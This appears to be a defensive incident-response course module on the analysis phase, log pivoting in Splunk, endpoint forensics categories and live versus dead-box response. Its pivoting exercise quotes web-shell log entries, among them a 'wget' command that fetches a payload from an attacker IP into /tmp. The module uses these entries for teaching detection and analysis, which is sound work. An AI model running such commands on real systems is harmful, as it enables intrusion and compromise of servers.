    S06 · P05Theory⏱ 10 min

    Bridging the gap — from "do we care?" to "what, how, where, how far?"

    INE explains the jump from detection to analysis with a museum at night.

    What INE says

    The analysis phase is the disciplined investigation that begins the moment an escalated alert is accepted as credible. Detection determines that something suspicious occurred; analysis determines what, how, where, and how far it went — using SIEM events, endpoint telemetry, memory captures, disk images, packet captures and OSINT.

    Why analysis existsMeaning
    VerificationEliminate false positives — confirm it is real
    ScopingAll affected hosts, users, data and timelines
    Root-cause discoveryThe entry vector and the weakness exploited
    Impact assessmentBusiness and regulatory consequences
    Decision supportActionable intelligence for containment, eradication, recovery
    Two ways to fail

    Under-scope and you leave a foothold behind. Over-scope and you cause a needless outage. Analysis prevents both under-reaction and over-reaction — and uncovers silent false negatives along the way.

    Keep this

    Analysis removes uncertainty: verify, scope, root cause, impact, decision.

    S06 · P07Hands-on⏱ 9 min

    Pivoting through logs

    Start with one piece of evidence — an IP, a user, a hash, a path — and use it to discover the related events that widen the picture.

    What INE says

    Pivoting through logs is the investigative practice of starting with one piece of evidence in your log data (IP address, process hash, username, file path, URL…) and using it as a pivot point to discover related events that broaden the picture of an incident.

    ▶ Follow the pivots

    The S4 web-shop case again. Each chip is one pivot; each answer gives you the next pivot.

    index=web_logs status=404 | top src_ip
    193.106.191.2291
    index=web_logs src_ip="193.106.191.22" method=POST | table timestamp uri status
    14:06:52/admin/login302
    later/admin/upload200
    index=web_logs uri="*shell.php*" | table timestamp uri
    14:08:52…?cmd=whoami
    14:09:18…?cmd=wget http://193.106.191.22/bd -O /tmp/bd
    index=* (dest_ip="193.106.191.22" OR src_ip="193.106.191.22") | stats count by index host
    Next pivot: every other log source — firewall, proxy, EDR — for this IP and for /tmp/bd on the web server.

    Start: one noisy signal.

    The IP → a successful login and an upload.

    The file → the attacker's commands.

    The payload host → leave the web logs, search everything.

    You havePivot to find
    IP addressOther hosts it touched · users who logged in from it · firewall/proxy/DNS hits
    UsernameAll logons (where, from where) · processes it ran · accounts it created
    Hash / file pathEvery host where it exists or ran · its parent process · how it arrived
    Time windowEverything on the same host ±5 minutes
    Keep this

    Every answer is the next question. Write each pivot in the case — it becomes your timeline.

    S06 · P09Case⏱ 15 min

    Deep analysis — the beacon on FIN-SQL01

    Deep analysis is the move from a quick "yes, how big" to a forensic-level understanding: how the threat worked, what changed, what was accessed, how to remove it without collateral damage.

    Triggered when

    Activity is confirmed malicious but not yet fully scoped · crown-jewel systems or regulated data are involved · containment needs surgical accuracy (root-cause patching, selective rollback, legal preservation).

    Two tracks

    Endpoint-centric: memory forensics, disk & registry, binary triage, super-timeline, user artefacts. Network-centric: PCAP replay, beacon timing, protocol carving, TLS/JA3 intel, lateral-flow graphs.

    CASE S06-01

    beacon.exe on a production SQL server

    Critical

    Brief

    Splunk raised a critical alert: a hidden PowerShell session on FIN-SQL01 downloaded beacon.exe from 198.51.100.77. Tier 1 escalated to you.

    2. 1–2Re-run ±5 min → three matching PowerShell events.

    What endpoint analysis reconstructs

    It turns "something bad happened on host X" into a precise, evidence-backed story.

    Endpoint analysisterm
    Definition
    The systematic examination of one host — workstation, server, VM, container or mobile device — after an alert implicates it.
    Why it exists
    Alerts say that something happened. Only the host's own artefacts show how it happened and what it changed.
    Where used
    Every escalated incident with a named host: deep analysis, containment planning, eradication, legal evidence.
    Example
    Reading the processes, autostart entries and logs of FIN-SQL01 after the beacon alert.
    SOC example
    "Was this host patient zero, or one victim of many?" — the host's timeline answers it.
    ObjectiveWhy it is crucial
    Validate the alertReal artefacts confirm a true positive and avoid a costly over-reaction.
    Scope the compromisePatient zero, or one victim of many?
    Identify the root causeFix the exact weakness, not the symptoms.
    Harvest IOCsHashes, C2 domains, registry keys → enterprise hunts and detection updates.
    Preserve evidenceForensically sound artefacts for legal, regulatory and insurance needs.
    Inform containment & eradicationWhat to isolate, which keys to delete, what to patch or reset.
    Quantify business impactWas sensitive data touched? That drives disclosure decisions.

    The analyst's menu — eleven categories

    ▶ Click a category

    Each one asks a different question of the host. You will meet most of them again — logs in Sessions 6–7, memory and disk in Sessions 10–11.

    Log analysis

    Asks: what did the OS or the EDR record?
    Artefacts: Windows event logs, Sysmon, journalctl, auth.log, audit.log
    Tools: SIEM (Splunk, ELK), grep/awk, Chainsaw

    Today: your two labs on web-prod-01 and the web shop.

    Process & execution tree

    Asks: what ran, and in what order?
    Artefacts: parent/child PIDs, command lines
    Tools: Process Explorer, EDR, KAPE

    Example: Word → PowerShell → beacon.exe is a story; any one of them alone is not.

    Persistence & autostart

    Asks: how does it survive a reboot?
    Artefacts: Run keys, scheduled tasks, services, WMI, cron, systemd units, authorized_keys
    Tools: Autoruns, RegRipper, Velociraptor

    Example: the S4 miner case — /etc/cron.d/mysql-backup.

    Memory forensics

    Asks: what lives only in RAM?
    Artefacts: injected DLLs, LSASS credentials, encryption keys
    Tools: Volatility, Rekall

    Example: malfind found the shellcode inside sqlservr.exe on FIN-SQL01.

    File system & disk

    Asks: what was created, modified or deleted?
    Artefacts: $MFT, USN journal, shadow copies, timestomped files
    Tools: FTK Imager, Autopsy, The Sleuth Kit

    Registry / hive analysis

    Asks: which configuration changes reveal activity?
    Artefacts: RecentDocs, Shellbags, UserAssist, SAM
    Tools: RegRipper, Registry Explorer, hivex

    User-activity artefacts

    Asks: what did the user open or run?
    Artefacts: jump lists, LNK files, browser history, RDP cache, .bash_history

    Credential & account analysis

    Asks: were credentials dumped, created or abused?
    Artefacts: hashes, Kerberos tickets, new admin accounts
    Tools: Kerberos and account-management logs, analysis of credential-dumping output

    Example: INE's Lab 3 — one admin account creates another.

    Binary / malware triage

    Asks: what does the payload do?
    Artefacts: hash, strings, imports, sandbox report
    Tools: Detect It Easy, PEStudio, CyberChef, a sandbox

    Driver / kernel module

    Asks: is there a rootkit or a malicious driver?
    Artefacts: unsigned drivers, SSDT hooks
    Tools: WinDbg

    Timeline (super-timeline)

    Asks: when did every artefact change?
    Artefacts: log, file-system and registry timestamps merged into one view
    Tools: Plaso, Timesketch

    S06 · P15Decision⏱ 10 min

    Live response or dead-box?

    Collect while the machine runs, or switch it off and image the disks? The answer decides which evidence survives.

    Live responseDead-box forensics
    WhatCollect while the machine runs (agent or scripts)Power off, image the disks, analyse the static media
    Use whenThe threat is still beaconing or moving · the host runs critical services · you need volatile data (RAM-only malware, sockets)The threat is contained and the host can go offline · legal needs a pristine snapshot · you need deep-disk artefacts (deleted files, timestomps, slack space)
    HowLive-response tool → RAM dump, processes, DLLs, connections, recent logs → hash, copy to a secure share, log every stepShut down → remove the drive or boot forensic media → bit-for-bit image → hash → write-once storage → mount read-only
    ToolsVelociraptor, GRR, EDR real-time response, remote PowerShellFTK Imager, dd, Clonezilla · Autopsy, Sleuth Kit, EnCase, X-Ways
    AdvantagesSaves what vanishes at shutdown · allows quick containment · minimal disruption when done rightForensically sound · deep file-system analysis · malware cannot react
    Trade-offsYour tools change the system (new files, timestamps) · malware may detect you · needs a tight procedure to stay defensibleVolatile artefacts are lost · downtime · imaging is slow and storage-heavy
    ▶ You decide — then check

    Four hosts, four situations.

    Live response first, then image

    A production database must stay up and the beacon is active. Isolate it on the network, capture RAM and connections with the live-response agent, hash everything — and image the disk when the business allows.

    Dead-box

    The threat is contained and the user can work on a spare laptop. Shut down, image bit for bit, hash, analyse a read-only copy. Malware cannot react to a powered-off disk.

    Both

    Court needs a pristine snapshot and what was in memory. Live RAM capture first, then a dead-box image — with every step in the chain-of-custody log.

    Common mistake

    Pulling the plug as a reflex. If the malware is fileless (RAM-only), the plug destroys your only evidence. Triage volatility before you touch the power.

    Volatile + critical host.

    Contained + can go offline.

    Legal needs both.

    Never by reflex.

    Keep this

    Live response saves what disappears first; dead-box imaging preserves everything that lasts. Skilled responders sequence both.

    Log analysis for responders

    Logs are the operating system's diary. Log analysis is searching, filtering, correlating and interpreting its entries.

    Endpoint log analysis answers five questions
    • 1Did anything malicious happen?
    • 2When, and how far did it go?
    • 3How did they get in — and stay in?
    • 4Which identities, files and data were touched?
    • 5Which IOCs protect everyone else?
    Why it is critical
    • ·Earliest, cheapest evidence — already there, simple to collect (unlike disk or memory).
    • ·High signal — parsed Windows, Sysmon and auditd logs map to ATT&CK with few false positives.
    • ·Bridges endpoint and network — PIDs and socket events link host activity to firewall and IDS alerts.
    • ·Rapid IOC expansion — one host's hashes and domains drive hunts on thousands.
    Responder competencyWhat it looks like
    Log-source literacyWindows: Security, Sysmon, PowerShell, TaskScheduler, WMI-Activity · Linux: journalctl, auth.log / secure, audit.log
    Core event IDsKnown by heart — 4624, 4625, 4688, 4720, 4732, 7045, Sysmon 1/3/11 (next session)
    Parsing & normalisingTurn raw lines into fields you can count and join
    Query & pivotChain events: command line → network → file; switch pivots hash → PID → IP → user
    Timeline buildingEvery event in one ordered story (Timeline Explorer, Plaso/Timesketch)
    IOC extractionPull IPs, hashes, accounts, paths out of the story — and enrich them
    Noise reductionSuppression filters, tuned Sigma rules
    Chain of custodyHash every exported log, record who exported it and when
    Keep this

    Same evidence, four modes. Choose by scale, speed and whether the host is still running — and always hash what you export.
